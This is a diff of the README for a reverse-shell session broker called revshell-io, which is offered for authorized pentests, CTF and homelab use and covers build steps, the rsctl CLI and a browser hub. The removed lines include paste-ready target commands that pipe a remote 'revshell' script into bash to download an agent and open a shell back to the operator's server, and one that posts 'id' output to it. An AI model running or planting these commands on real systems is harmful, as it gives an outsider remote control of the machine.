@@ -1,6 +1,7 @@
-# revshell-io
+# [revshells.io](https://revshells.io)
 
-Callback/session broker for authorized pentests. Targets call back over HTTPS, operators attach from browser or CLI.
+Callback/session broker for authorized pentests, CTF, or homelab. Targets call back over HTTPS, operators attach from browser or CLI.
+
 
 ## Build
 
@@ -13,21 +14,6 @@ CI builds static **rsd**, **rsctl**, and **rs-agent** for:
 | linux-386 (x86) | linux / 386 |
 | darwin-amd64 (x86_64) | darwin / amd64 |
 | darwin-arm64 (aarch64) | darwin / arm64 |
-
-**CI artifacts** (every push to `main`): [Actions → Build](https://github.com/nmagill123/revshell-io/actions/workflows/build.yml) — download per-platform artifacts from the latest green run.
-
-**GitHub Releases** (tagged versions only — not created on ordinary pushes):
-
-```bash
-git tag v0.1.0
-git push origin v0.1.0
-```
-
-Or trigger manually: Actions → **Release** → Run workflow.
-
-Latest release: https://github.com/nmagill123/revshell-io/releases/latest
-
-Each release includes `rsd-*`, `rsctl-*`, `rs-agent-*`, README metadata per arch, and `agents-bin-linux.tar.gz` for `rsd --agents-dir`.
 
 ```
 make all          # rsd, rsctl, and cross-compiled rs-agent binaries
@@ -45,8 +31,6 @@ make agents       # required: agents-bin/linux-amd64, linux-arm64, ...
 
 `--agents-dir` must contain `rs-agent` builds from `make agents`. Callback URLs use the request `Host` (so Docker targets can use `host.docker.internal:8080` without editing the script).
 
-There is **no global admin token**. Open the hub in a browser to get a workspace cookie (24h), then mint a workspace CLI token from the hub panel for `rsctl`.
-
 `--max-sessions-per-workspace` (default `12`) limits how many active sessions each workspace can create.
 
 Put Caddy/nginx in front for TLS:
@@ -63,9 +47,6 @@ rs.example.com {
 # Mint token from http://localhost:8080/ (rsctl panel), then:
 rsctl login http://localhost:8080 <workspace-cli-token>
 
-# Create session (counts toward your workspace cap)
-rsctl new --name htb-box
-
 # List sessions
 rsctl list
 
@@ -75,27 +56,7 @@ rsctl attach <session-id>
 # Kill session
 rsctl kill <session-id>
 
-# Dump generated payload
-rsctl gen <session-id> --type sh
-rsctl gen <session-id> --type nopty
 ```
-
-## Target Callbacks
-
-`rsctl new` prints ready-to-paste commands:
-
-```bash
-# Bootstrap: detects arch, downloads rs-agent, runs PTY shell (falls back to HTTP poll)
-curl -fsSL https://rs.example.com/<uuid>/revshell | bash
-
-# From Docker (use host that reaches your machine)
-curl -fsSL http://host.docker.internal:8080/<uuid>/revshell | bash
-
-# One-shot event
-curl -sk -X POST https://rs.example.com/s/<id>/<secret>/event -d "$(id)"
-```
-
-The `revshell` script uses `curl` or `wget` to fetch `/<uuid>/agent/linux-arm64` (etc.), then execs the agent with `RSD_SERVER`, `RSD_SESSION`, `RSD_SECRET`.
 
 ## Browser UI
 
@@ -111,25 +72,6 @@ Open `http://localhost:8080/` for the **sessions hub**:
 rsctl login http://localhost:8080 <token>
 rsctl list
 rsctl attach <session-id>
-```
-
-Config: `~/.rsctl` (or `./.rsctl`). Env vars `RSD_SERVER` / `RSD_TOKEN` override the file.
-
-### Testing without PTY
-
-Force HTTP command mode (line-oriented: type a command, press Enter; no real TTY). Dead nopty beacons are removed after ~45s of silence; operators see `[beacon disconnected]` and attach closes. Browser resize events are ignored in command mode.
-
-```bash
-# Callback sets RSD_NO_PTY=1 on the agent
-curl -fsSL http://localhost:8080/<session-id>/nopty | bash
-
-# Or run agent directly
-RSD_NO_PTY=1 ./rs-agent -server http://localhost:8080 -session <id> -secret <secret>
-./rs-agent --no-pty -server ... -session ... -secret ...
-
-# Docker: hide PTY device
-docker run --rm -v /dev/null:/dev/ptmx amazonlinux \
-  curl -fsSL http://host.docker.internal:8080/<id>/revshell | bash
 ```
 
 ## Modes
